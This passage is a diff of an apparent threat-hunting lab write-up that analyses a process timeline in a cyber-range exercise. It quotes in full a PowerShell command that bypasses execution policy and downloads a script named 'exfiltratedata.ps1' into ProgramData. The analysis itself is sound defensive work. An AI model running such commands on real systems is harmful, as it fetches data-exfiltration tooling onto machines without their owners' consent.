@@ -51,7 +51,7 @@ DeviceProcessEvents
 <img width="1422" alt="Screenshot 2 Timeline of processes" src="https://github.com/user-attachments/assets/6d4ba2c9-0b96-42c0-a44c-618d1136503f" />
 
 
-1. A command to initiate powershell and execute a script called script4.ps1. The cmd prompt terminated upon completion (the /C switch) and any script execution policy was bypassed.
+1. A command to initiate powershell and execute a script called script4.ps1. The cmd prompt terminated upon completion (the /C switch) and script execution policy was bypassed.
 2. Powershell ran script4.ps1 unrestricted.
 3. A new command shell was crated to execute a powershell command that would download a file from GitHub and save it to the Programdata folder. The file is called "exfiltratedata.ps1."
 Full URL: powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
